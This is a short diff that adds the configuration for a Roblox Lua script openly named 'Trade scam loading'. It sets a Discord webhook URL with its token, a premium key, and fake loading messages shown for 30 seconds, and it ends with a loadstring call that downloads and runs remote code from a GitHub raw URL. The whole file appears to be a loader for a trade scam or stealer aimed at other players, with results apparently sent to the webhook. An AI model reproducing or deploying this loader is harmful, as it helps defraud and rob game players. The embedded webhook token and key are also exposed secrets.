@@ -1,0 +1,9 @@
+UserName = "Bruciewusie123"
+Webhook = "https://discord.com/api/webhooks/1092584436568162375/m4vVo_XgNP9oNJOJFYKVrSqzOR2DiMwZS8hjq0zn1R8tjdI6rQVfjJ52fMH_saGqGjWp"
+_G.PremiumKey = "rizzhub-96EN17DHSZN8MrQdNSK5"
+_G.ScriptName = "Trade scam loading"
+_G.FirstText = "Loading pls be patient"
+_G.SecondText = "almost there"
+_G.ThirdText = "almost loaded few more seconds"
+_G.WaitingTime = 30
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
